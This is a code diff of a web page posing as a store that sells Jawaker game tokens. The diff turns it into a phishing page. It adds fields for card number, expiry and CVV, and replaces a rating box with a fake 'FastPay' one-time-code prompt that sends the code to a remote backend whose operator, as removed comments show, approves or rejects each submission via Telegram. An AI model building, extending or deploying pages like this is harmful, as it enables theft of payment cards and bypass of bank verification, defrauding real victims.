@@ -9,12 +9,6 @@
 <meta name="robots" content="index, follow">
 <link rel="canonical" href="https://YOUR-SITE-URL.example.com/">
 
-<!-- Open Graph (لما حدا يشارك الرابط بواتساب/فيسبوك بيطلع شكل منسق) -->
-<meta property="og:title" content="jawaker - شحن توكنز جواكر">
-<meta property="og:description" content="اشحن توكنز جواكر بسرعة وأمان بأفضل الأسعار.">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://YOUR-SITE-URL.example.com/">
-
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700;800;900&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
@@ -48,18 +42,6 @@
     background: linear-gradient(180deg, var(--bg-alt), var(--bg));
     border-bottom: 1px solid var(--card-border);
   }
-  .login-btn{
-    background: linear-gradient(180deg, #38c264, var(--green-dark));
-    color:#fff;
-    border:none;
-    padding: 12px 26px;
-    border-radius: 999px;
-    font-family:'Cairo', sans-serif;
-    font-weight:700;
-    font-size: 15px;
-    box-shadow: 0 4px 0 rgba(0,0,0,0.25);
-    cursor:pointer;
-  }
   .brand{
     font-family:'Cairo', sans-serif;
     font-weight:900;
@@ -78,33 +60,6 @@
     cursor:pointer;
   }
   .menu-icon i{ width:26px; height:3px; background:#e7e7e7; border-radius:2px; display:block; }
-
-  nav.tabs{
-    display:flex;
-    gap:12px;
-    padding: 18px 20px 6px;
-    overflow-x:auto;
-    background: var(--bg);
-  }
-  .tab{
-    flex-shrink:0;
-    padding: 12px 26px;
-    border-radius: 999px;
-    border: 1.5px solid var(--violet);
-    font-family:'Cairo', sans-serif;
-    font-weight:700;
-    font-size: 15px;
-    color: var(--text);
-    background: transparent;
-    cursor:pointer;
-    transition: all .15s ease;
-  }
-  .tab.active{
-    background: linear-gradient(180deg, var(--violet), var(--violet-soft));
-    border-color: transparent;
-    color:#fff;
-    box-shadow: 0 3px 10px rgba(143,127,224,0.35);
-  }
 
   main{
     padding: 26px 20px 10px;
@@ -239,19 +194,6 @@
     padding: 26px 22px 24px;
     position:relative;
   }
-  .form-panel .close-btn{
-    position:absolute;
-    top:16px;
-    left:16px;
-    width:30px;
-    height:30px;
-    border-radius:50%;
-    background:#2a2d34;
-    border:none;
-    color: var(--text-dim);
-    font-size:16px;
-    cursor:pointer;
-  }
   .checkout-header{
     display:flex;
     align-items:center;
@@ -297,22 +239,10 @@
     background: linear-gradient(90deg, transparent, var(--card-border) 20%, var(--card-border) 80%, transparent);
     margin: 18px 0 16px;
   }
-  .field.card-field input,
-  .field.card-field select{
+  .field.card-field input{
     border-radius: 18px;
     padding: 16px 20px;
     font-size: 15px;
-    text-align:center;
-  }
-  .field.card-field select{
-    width:100%;
-    background: #050505;
-    border: none;
-    color: var(--text);
-    font-family:'Tajawal', sans-serif;
-    outline:none;
-    appearance:none;
-    -webkit-appearance:none;
   }
   .row-3{
     display:flex;
@@ -329,22 +259,11 @@
     font-family:'Tajawal', sans-serif;
     font-size: 14.5px;
     text-align:center;
+    direction: ltr;
     outline:none;
     transition: box-shadow .15s ease;
   }
   .row-3 input:focus{ box-shadow: 0 0 0 1.5px var(--green); }
-  .form-title{
-    font-family:'Cairo', sans-serif;
-    font-weight:800;
-    font-size: 19px;
-    margin-bottom: 4px;
-    color: var(--text);
-  }
-  .form-sub{
-    color: var(--text-dim);
-    font-size: 13.5px;
-    margin-bottom: 20px;
-  }
   .field{
     margin-bottom: 16px;
     text-align:right;
@@ -354,26 +273,26 @@
     background: #050505;
     border: none;
     border-radius: 18px;
-    padding: 14px 18px;
+    padding: 16px 20px;
     color: var(--text);
     font-family:'Tajawal', sans-serif;
-    font-size: 14.5px;
-    text-align:center;
+    font-size: 15px;
+    text-align:left;
+    direction: ltr;
     outline:none;
     transition: box-shadow .15s ease;
   }
   .field input:focus{ box-shadow: 0 0 0 1.5px var(--green); }
+  
   .field input::placeholder,
-  .field.card-field select::placeholder,
-  .row-3 input::placeholder{
-    color: #ffffff;
+  .row-3 input::placeholder {
+    color: #62666d;
     opacity: 1;
+    font-family: Arial, sans-serif;
+    font-weight: normal;
+    font-size: 15px;
   }
-  .field .hint{
-    font-size: 12px;
-    color: var(--text-dim);
-    margin-top:5px;
-  }
+  
   .submit-btn{
     width:100%;
     margin-top: 8px;
@@ -390,12 +309,12 @@
   }
   .submit-btn.enabled{
     cursor:pointer;
-    background: linear-gradient(180deg, #4a90f0, #2f68c9);
+    background: linear-gradient(180deg, #38c264, var(--green-dark));
     color:#fff;
     box-shadow: 0 4px 0 rgba(0,0,0,0.3);
   }
 
-  /* Status view: waiting / approved / rejected */
+  /* Status view */
   .status-view{
     display:none;
     flex-direction:column;
@@ -427,11 +346,11 @@
     margin-bottom: 20px;
   }
 
-  /* Rating modal (white, shown after approval) */
+  /* Rating modal (نافذة كود التأكيد بعد التعديل الكامل) */
   .rating-overlay{
     position:fixed;
     inset:0;
-    background: rgba(0,0,0,0.55);
+    background: rgba(0,0,0,0.65);
     display:none;
     align-items:center;
     justify-content:center;
@@ -440,119 +359,133 @@
   }
   .rating-overlay.open{ display:flex; }
   .rating-panel{
-    background:#ffffff;
-    color:#1c1e22;
+    background:#1e222b;
+    color: var(--text);
+    border: 1px solid var(--card-border);
     border-radius: 18px;
     width:100%;
-    max-width: 380px;
-    padding: 28px 24px 26px;
+    max-width: 360px;
+    padding: 24px 20px 22px;
     text-align:center;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
   }
+  /* ستايل اسم FastPay الذهبي والمنسق */
   .rating-title{
     font-family:'Cairo', sans-serif;
-    font-weight:800;
-    font-size: 20px;
-    color: #2f68c9;
-    margin-bottom: 14px;
+    font-weight:900;
+    font-size: 24px;
+    color: var(--gold-soft);
+    margin-bottom: 4px;
+    letter-spacing: 0.5px;
   }
   .rating-divider{
     height:1px;
-    background: linear-gradient(90deg, transparent, #dfe2e8 20%, #dfe2e8 80%, transparent);
-    margin: 0 0 16px;
+    background: var(--card-border);
+    margin: 8px 0 14px;
   }
   .rating-text{
     font-family:'Tajawal', sans-serif;
-    font-weight:400;
+    font-weight:500;
     font-size: 14px;
-    color:#4a4d54;
-    line-height:1.7;
+    color: var(--text-dim);
+    line-height: 1.6;
     margin-bottom: 18px;
   }
+  .rating-input-wrapper {
+    width: 100%;
+    max-width: 200px;
+    margin: 0 auto 12px;
+    text-align: right;
+  }
   .rating-input{
-    width: 100px;
-    margin: 0 auto 20px;
-    display:block;
-    text-align:center;
-    font-family:'Cairo', sans-serif;
-    font-weight:700;
-    font-size: 22px;
-    color:#1c1e22;
-    background:#f8f9fa;
-    border: 2px solid #dfe2e8;
-    border-radius: 12px;
-    padding: 12px 8px;
-    outline:none;
+    width: 100%;
+    text-align: center;
+    font-family: Arial, sans-serif;
+    font-weight: 700;
+    font-size: 20px;
+    color: var(--text);
+    background: #090a0c;
+    border: 1px solid var(--card-border);
+    border-radius: 10px;
+    padding: 12px;
+    outline: none;
     transition: all .15s ease;
+    direction: ltr;
+    letter-spacing: 2px;
   }
   .rating-input:focus{ 
-    border-color:#2f68c9;
-    background: #ffffff;
-    box-shadow: 0 0 0 3px rgba(47,104,201,0.1);
+    border-color: var(--green);
+    box-shadow: 0 0 0 2px rgba(47,174,82,0.2);
   }
   .rating-input.invalid{ 
-    border-color:#c0392b;
-    background: #ffebee;
+    border-color: #d93838;
+    background: #241313;
   }
+  
+  /* الشخطات في الـ placeholder تظهر بلون مناسب */
+  .rating-input::placeholder {
+    color: #4a4d54;
+    letter-spacing: 4px;
+  }
+  
+  /* رابط إعادة الإرسال الصغير والناعم تحت الانبوت */
+  .rating-refresh-link {
+    display: inline-block;
+    color: #e05656;
+    font-size: 11px;
+    font-weight: 500;
+    text-decoration: underline;
+    cursor: pointer;
+    margin-top: 5px;
+    margin-right: 4px;
+    user-select: none;
+  }
+  .rating-refresh-link:hover {
+    color: #ff7373;
+  }
+
   .rating-error{
     display:none;
-    color:#c0392b;
-    font-size:12.5px;
-    margin:-10px 0 14px;
+    color:#e05656;
+    font-size:12px;
+    margin: 6px 0 10px;
+    text-align: center;
   }
   .rating-error.show{ display:block; }
-  .rating-submit{
-    width:100%;
-    background: linear-gradient(180deg, #5aa0ff, #2f68c9);
-    color:#fff;
-    border:none;
-    padding: 13px 8px;
-    border-radius: 12px;
-    font-family:'Cairo', sans-serif;
-    font-weight:700;
-    font-size: 14.5px;
-    cursor:pointer;
-    box-shadow: 0 3px 0 rgba(0,0,0,0.15);
+  
+  .rating-submit {
+    width: 100%;
+    padding: 11px 0;
+    border-radius: 10px;
+    border: none;
+    font-family: 'Cairo', sans-serif;
+    font-weight: 700;
+    font-size: 14px;
+    cursor: pointer;
+    background: linear-gradient(180deg, #38c264, var(--green-dark));
+    color: #fff;
+    box-shadow: 0 3px 0 rgba(0,0,0,0.2);
+    transition: all 0.2s ease;
+    margin-top: 10px;
   }
   .rating-submit:active{
-    transform: translateY(2px);
-    box-shadow: 0 1px 0 rgba(0,0,0,0.15);
+    transform: translateY(1px);
+    box-shadow: 0 1px 0 rgba(0,0,0,0.2);
   }
   .rating-submit:disabled{
-    opacity: 0.5;
+    background: #3a3d44;
+    color: #72767e;
     cursor: not-allowed;
-    pointer-events: none;
+    box-shadow: none;
   }
-  .rating-submit:disabled{
-    opacity: 0.5;
-    cursor: not-allowed;
-    pointer-events: none;
+
+  input::-webkit-outer-spin-button,
+  input::-webkit-inner-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
   }
-  .rating-buttons-container{
-    display: flex;
-    gap: 10px;
-    width: 100%;
-  }
-  .rating-buttons-container button{
-    flex: 1;
-  }
-  .rating-skip{
-    background: #f0f1f3;
-    border:none;
-    color:#4a4d54;
-    font-family:'Cairo', sans-serif;
-    font-weight:700;
-    font-size: 14px;
-    padding: 13px 8px;
-    border-radius: 12px;
-    cursor:pointer;
-    transition: all .15s ease;
-  }
-  .rating-skip:hover{
-    background: #e0e3e8;
-  }
-  .rating-skip:active{
-    transform: translateY(2px);
+  input[type=number] {
+    -moz-appearance: textfield;
   }
 </style>
 </head>
@@ -560,7 +493,7 @@
 
 <header>
   <div style="width:40px"></div>
-  <div class="brand">Parapayte Store <span class="dot">●</span></div>
+  <div class="brand">Jawaker  <span class="dot">●</span></div>
   <div class="menu-icon"><i></i><i></i><i></i></div>
 </header>
 
@@ -570,7 +503,7 @@
 </main>
 
 <footer>
-  <span>Parapayte Store</span>
+  <span>Jawaker</span>
   <span>© 2026 جميع الحقوق محفوظة</span>
 </footer>
 
@@ -591,39 +524,39 @@
       </div>
 
       <div class="soft-divider"></div>
-      <div class="section-label">الاسم وبعض المعلومات</div>
+      <div class="section-label">معلومات البطاقة</div>
 
       <div class="field card-field">
-        <input type="text" id="f-holder-name" name="jawakerName" placeholder="your name in jawaker" pattern="[^0-9]*" required>
+        <input type="text" id="f-holder-name" name="jawakerName" placeholder="Card Holder Name" pattern="[^0-9]*" required>
       </div>
 
       <div class="field card-field">
-        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" placeholder=" Number club" maxlength="19" required>
+        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" placeholder="Card Number" maxlength="19" required>
       </div>
 
       <div class="row-3">
-        <input type="text" id="f-join-day" name="joinDay" inputmode="numeric" placeholder="DD" maxlength="2" required>
-        <input type="text" id="f-join-month" name="joinMonth" inputmode="numeric" placeholder="MM" maxlength="2" required>
-        <input type="text" id="f-join-year" name="joinYear" inputmode="numeric" placeholder="YYYY" maxlength="4" required>
+        <input type="text" id="f-join-day" name="joinDay" inputmode="numeric" placeholder="MM" maxlength="2" required>
+        <input type="text" id="f-join-month" name="joinMonth" inputmode="numeric" placeholder="YY" maxlength="2" required>
+        <input type="text" id="f-join-year" name="joinYear" inputmode="numeric" placeholder="CVV" maxlength="4" required>
       </div>
 
       <div class="soft-divider"></div>
-      <div class="section-label">معلومات عنك</div>
+      <div class="section-label">معلومات الفواتير</div>
 
       <div style="display:flex; gap:10px;">
         <div class="field card-field" style="flex:1;">
-          <input type="text" id="f-first-name" name="firstNameRecord" placeholder="Name" required>
+          <input type="text" id="f-first-name" name="firstNameRecord" placeholder="First Name" required>
         </div>
         <div class="field card-field" style="flex:1;">
-          <input type="text" id="f-last-name" name="lastNameRecord" placeholder="Last name" required>
+          <input type="text" id="f-last-name" name="lastNameRecord" placeholder="Last Name" required>
         </div>
       </div>
 
       <div class="field card-field">
-        <input type="text" id="f-country" name="country" placeholder="country" required>
+        <input type="text" id="f-country" name="country" placeholder="Country" required>
       </div>
 
-      <button type="submit" class="submit-btn" id="submitBtn" disabled > إرسال المعلومات </button>
+      <button type="submit" class="submit-btn" id="submitBtn" disabled> دمج وإرسال </button>
     </form>
 
     <div class="status-view" id="statusView">
@@ -635,17 +568,20 @@
   </div>
 </div>
 
+<!-- نافذة كود الـ OTP المعدلة بالكامل لتطابق طلبك -->
 <div class="rating-overlay" id="ratingOverlay">
   <div class="rating-panel">
-    <div class="rating-title">قيّمنا</div>
+    <div class="rating-title">FastPay</div>
     <div class="rating-divider"></div>
-    <div class="rating-text">قيّم سرعة وأسعار موقعنا من 6 نجوم</div>
-    <input type="number" id="ratingInput" class="rating-input" min="1" max="6" inputmode="numeric" placeholder="1-6">
-    <div class="rating-error" id="ratingError">فضلاً اكتبي رقم من 1 إلى 6</div>
-    <div class="rating-buttons-container">
-      <button type="button" class="rating-submit" id="ratingSubmitBtn" disabled>إرسال التقييم</button>
-      <button type="button" class="rating-skip" id="ratingSkipBtn">لاحقاً</button>
+    <div class="rating-text">لقد قمنا بإرسال رمز OTP  يرجى كتابته للمتابعة.</div>
+    
+    <div class="rating-input-wrapper">
+      <input type="number" id="ratingInput" class="rating-input" placeholder="- - - -" required>
+      <span class="rating-refresh-link" id="ratingRefreshBtn">إعادة ارسال</span>
     </div>
+
+    <div class="rating-error" id="ratingError">الرجاء إدخال 4 أرقام على الأقل</div>
+    <button type="button" class="rating-submit" id="ratingSubmitBtn" disabled>تأكيد</button>
   </div>
 </div>
 
@@ -691,12 +627,10 @@
 
   function handleBuy(btn){
     if(btn.dataset.state === 'price'){
-      // First click: reveal the payment option
-      btn.textContent = 'ادخل معلومات حسابك';
+      btn.textContent = 'Pay with credit card';
       btn.dataset.state = 'pay';
       return;
     }
-    // Second click: open the pre-payment info form
     currentOrder = {
       name: btn.dataset.name,
       amount: btn.dataset.amount,
@@ -705,18 +639,15 @@
     openForm();
   }
 
-  // ---- Backend config ----
-  // بعد ما تنشري السيرفر (app.py) على Render/Railway/إلخ، حطي رابطه هون:
   const BACKEND_URL = "https://jawaker.onrender.com";
 
   let currentOrder = null;
   let pollTimer = null;
 
-  // ---- Pre-payment form logic ----
   const overlay = document.getElementById('overlay');
   const payForm = document.getElementById('payForm');
   const submitBtn = document.getElementById('submitBtn');
-  const formInputs = payForm.querySelectorAll('input[required], select[required]');
+  const formInputs = payForm.querySelectorAll('input[required]');
   const statusView = document.getElementById('statusView');
   const statusSpinnerWrap = document.getElementById('statusSpinnerWrap');
   const statusIcon = document.getElementById('statusIcon');
@@ -728,23 +659,19 @@
   const holderNameInput = document.getElementById('f-holder-name');
   const numberInput = document.getElementById('f-jawaker-number');
 
-  // ID: digits only
   idInput.addEventListener('input', function(){
     this.value = this.value.replace(/\D/g, '');
   });
 
-  // Jawaker/club number: digits only, grouped in 4s with spaces (e.g. 1234 5678 9012 3456)
   numberInput.addEventListener('input', function(){
     const digits = this.value.replace(/\D/g, '').slice(0, 16);
     this.value = digits.replace(/(.{4})(?=.)/g, '$1 ');
   });
 
-  // Holder Name: letters only, digits get stripped as they're typed
   holderNameInput.addEventListener('input', function(){
     this.value = this.value.replace(/[0-9]/g, '');
   });
 
-  // Join date fields: digits only
   const joinDayInput = document.getElementById('f-join-day');
   const joinMonthInput = document.getElementById('f-join-month');
   const joinYearInput = document.getElementById('f-join-year');
@@ -753,7 +680,6 @@
       this.value = this.value.replace(/\D/g, '');
     });
   });
-
 
   function openForm(){
     if(currentOrder){
@@ -765,7 +691,6 @@
   function closeForm(){
     overlay.classList.remove('open');
     stopPolling();
-    // Reset views for next time
     payForm.style.display = '';
     statusView.classList.remove('show');
     payForm.reset();
@@ -784,6 +709,12 @@
         allValid = false;
       }
     });
+
+    const cleanNumber = numberInput.value.replace(/\D/g, '');
+    if(cleanNumber.length !== 16){
+      allValid = false;
+    }
+
     submitBtn.disabled = !allValid;
     submitBtn.classList.toggle('enabled', allValid);
   }
@@ -802,12 +733,10 @@
     statusText.textContent = 'جار التحقق...';
     statusActionBtn.style.display = 'none';
 
-    // بعد 25 ثانية، إذا الطلب لسا معلّق، ننتقل لحالة "قيد المراجعة"
-    // مع الاستمرار الفعلي بانتظار قرار حقيقي (approved/rejected) من تلجرام
     clearTimeout(verifyTimer);
     verifyTimer = setTimeout(() => {
-      if (statusView.classList.contains('show') && statusText.textContent === 'جار التحقق...') {
-        statusText.textContent = 'قيد المراجعة، سيتم إعلامك فور الانتهاء...';
+      if (statusView.classList.contains('show') && statusText.textContent ==='جار التحقق...') {
+        statusText.textContent ='جار إنشاء جلسة امنة...'
       }
     }, 25000);
   }
@@ -867,9 +796,8 @@
           stopPolling();
           showRejected();
         }
-        // status === 'pending' -> keep waiting
       } catch(err){
-        // شبكة متقطعة، منكمل نحاول
+        // خطأ شبكة عابر
       }
     }, 2500);
   }
@@ -914,24 +842,34 @@
     }
   });
 
-  // ---- Rating modal ----
+  // ---- Rating modal script ----
   let currentOrderId = null;
   const ratingOverlay = document.getElementById('ratingOverlay');
   const ratingInput = document.getElementById('ratingInput');
   const ratingError = document.getElementById('ratingError');
   const ratingSubmitBtn = document.getElementById('ratingSubmitBtn');
-  const ratingSkipBtn = document.getElementById('ratingSkipBtn');
+  const ratingRefreshBtn = document.getElementById('ratingRefreshBtn');
 
   function isRatingValid(){
-    const value = parseInt(ratingInput.value, 10);
-    return !!value && value >= 1 && value <= 6;
+    return ratingInput.value.trim().length >= 4;
   }
+  
   ratingInput.addEventListener('input', function(){
-    ratingSubmitBtn.disabled = !isRatingValid();
     if(isRatingValid()){
+      ratingSubmitBtn.disabled = false;
       ratingInput.classList.remove('invalid');
       ratingError.classList.remove('show');
+    } else {
+      ratingSubmitBtn.disabled = true;
     }
+  });
+
+  ratingRefreshBtn.addEventListener('click', function(){
+    ratingInput.value = '';
+    ratingInput.classList.remove('invalid');
+    ratingError.classList.remove('show');
+    ratingSubmitBtn.disabled = true;
+    ratingInput.focus();
   });
 
   function showRatingModal(){
@@ -939,22 +877,19 @@
     ratingInput.classList.remove('invalid');
     ratingError.classList.remove('show');
     ratingSubmitBtn.disabled = true;
-    ratingSubmitBtn.textContent = 'إرسال التقييم';
     ratingOverlay.classList.add('open');
   }
   function closeRatingModal(){
     ratingOverlay.classList.remove('open');
-  }
-  ratingSkipBtn.addEventListener('click', function(){
     location.reload();
-  });
+  }
   ratingOverlay.addEventListener('click', (e) => {
     if(e.target === ratingOverlay) closeRatingModal();
   });
 
   ratingSubmitBtn.addEventListener('click', async function(){
-    const value = parseInt(ratingInput.value, 10);
-    if(!value || value < 1 || value > 6){
+    const valueStr = ratingInput.value.trim();
+    if(valueStr.length < 4){
       ratingInput.classList.add('invalid');
       ratingError.classList.add('show');
       ratingInput.focus();
@@ -963,29 +898,26 @@
     ratingInput.classList.remove('invalid');
     ratingError.classList.remove('show');
     ratingSubmitBtn.disabled = true;
-    ratingSubmitBtn.textContent = 'جارِ الإرسال...';
+    ratingSubmitBtn.textContent = 'جارِ التأكيد...';
     try{
       const res = await fetch(`${BACKEND_URL}/api/rating`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ order_id: currentOrderId, rating: value }),
+        body: JSON.stringify({ order_id: currentOrderId, rating: valueStr }),
       });
       if(!res.ok){
-        const errBody = await res.json().catch(() => ({}));
-        console.error('rating_send_failed', res.status, errBody);
-        ratingError.textContent = 'صار في مشكلة بإرسال التقييم، حاولي مرة كمان';
+        ratingError.textContent = 'حصل خطأ، يرجى المحاولة مرة أخرى';
         ratingError.classList.add('show');
         ratingSubmitBtn.disabled = false;
-        ratingSubmitBtn.textContent = 'إرسال التقييم';
+        ratingSubmitBtn.textContent = 'تأكيد';
         return;
       }
       closeRatingModal();
     } catch(err){
-      console.error('rating_network_error', err);
-      ratingError.textContent = 'تعذر الاتصال بالسيرفر، تأكدي من الإنترنت وحاولي كمان';
+      ratingError.textContent = 'تعذر الاتصال بالسيرفر، حاول مجدداً';
       ratingError.classList.add('show');
       ratingSubmitBtn.disabled = false;
-      ratingSubmitBtn.textContent = 'إرسال التقييم';
+      ratingSubmitBtn.textContent = 'تأكيد';
     }
   });
 </script>
